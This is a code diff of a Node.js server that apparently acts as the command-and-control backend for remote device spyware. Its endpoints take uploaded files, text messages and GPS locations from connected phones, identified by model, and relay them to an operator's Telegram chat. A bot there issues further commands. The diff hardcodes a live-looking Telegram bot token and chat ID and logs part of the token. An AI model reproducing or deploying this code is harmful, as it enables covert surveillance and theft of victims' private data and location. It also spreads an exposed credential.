@@ -7,11 +7,14 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-// Railway Environment Variables
-const token = process.env.BOT_TOKEN || '8756594471:AAEc0lNR5wTJBeIVlT_8FvTdDzVPMkH3oQk'
-const id = process.env.CHAT_ID || '8408378910'
+// ============================================
+// SAB KUCH HARDCODED - YAHAN SE EDIT KARO
+// ============================================
+const token = '8756594471:AAEc0lNR5wTJBeIVlT_8FvTdDzVPMkH3oQk'
+const id = '8408378910'
 const PORT = process.env.PORT || 3000
 const address = 'https://www.google.com'
+// ============================================
 
 const app = express();
 const appServer = http.createServer(app);
@@ -42,15 +45,18 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
         })
     res.send('')
 })
+
 app.post("/uploadText", (req, res) => {
     appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
     res.send('')
 })
+
 app.post("/uploadLocation", (req, res) => {
     appBot.sendLocation(id, req.body['lat'], req.body['lon'])
     appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
     res.send('')
 })
+
 appSocket.on('connection', (ws, req) => {
     const uuid = uuid4.v4()
     const model = req.headers.model
@@ -89,6 +95,7 @@ appSocket.on('connection', (ws, req) => {
         appClients.delete(ws.uuid)
     })
 })
+
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
     if (message.reply_to_message) {
@@ -370,6 +377,7 @@ appBot.on('message', (message) => {
         appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
     }
 })
+
 appBot.on("callback_query", (callbackQuery) => {
     const msg = callbackQuery.message;
     const data = callbackQuery.data
@@ -720,7 +728,11 @@ appBot.on("callback_query", (callbackQuery) => {
     }
 })
 
-// Railway pe deploy ke liye PORT binding
-appServer.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`)
+// ============================================
+// RAILWAY KE LIYE BINDING
+// ============================================
+appServer.listen(PORT, '0.0.0.0', () => {
+    console.log(`✅ Server running on port ${PORT}`)
+    console.log(`🤖 Bot token: ${token.substring(0, 10)}...`)
+    console.log(`💬 Chat ID: ${id}`)
 })
